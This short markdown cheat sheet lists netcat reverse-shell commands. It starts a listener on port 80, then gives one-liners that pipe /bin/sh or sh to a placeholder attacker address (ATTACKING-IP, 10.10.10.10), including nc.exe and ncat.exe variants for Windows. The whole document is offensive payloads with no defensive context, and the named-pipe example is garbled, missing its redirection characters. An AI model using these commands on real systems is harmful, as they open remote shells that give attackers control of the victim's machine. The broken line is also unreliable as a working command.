### Start your listner 
```
nc -lnvp 80
```
### Listner Examples
* Example one
``` 
nc -e /bin/sh ATTACKING-IP 80
```
* Example two
```
/bin/sh | nc ATTACKING-IP 80
```
* Example Three
```
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```
### Example Of Using Netcat for Reverse Shell

```
nc 10.10.10.10 9001 -e sh
nc.exe 10.10.10.10 9001 -e sh
nc -c sh 10.10.10.10 9001
ncat 10.10.10.10 9001 -e sh
ncat.exe 10.10.10.10 9001 -e sh
```
